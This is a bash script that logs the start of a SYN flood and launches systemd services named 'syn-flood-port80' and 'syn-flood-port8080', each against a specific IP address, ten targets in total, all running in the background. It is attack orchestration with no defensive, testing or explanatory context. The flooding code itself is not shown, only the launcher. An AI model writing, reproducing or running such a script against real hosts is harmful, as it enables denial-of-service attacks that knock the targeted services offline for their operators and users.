#!/bin/bash
logger -s -t "$0" Starting SYN flood
/usr/sbin/service syn-flood-port80@27.128.0.20 start &
/usr/sbin/service syn-flood-port80@175.45.178.12 start &
/usr/sbin/service syn-flood-port80@109.230.200.203 start &
/usr/sbin/service syn-flood-port80@27.128.6.44 start &
/usr/sbin/service syn-flood-port80@175.45.178.83 start &
/usr/sbin/service syn-flood-port8080@109.230.200.199 start &
/usr/sbin/service syn-flood-port8080@27.128.200.7 start &
/usr/sbin/service syn-flood-port8080@175.45.178.161 start &
/usr/sbin/service syn-flood-port8080@109.230.200.77 start &
/usr/sbin/service syn-flood-port8080@27.128.41.118 start 
sleep 5


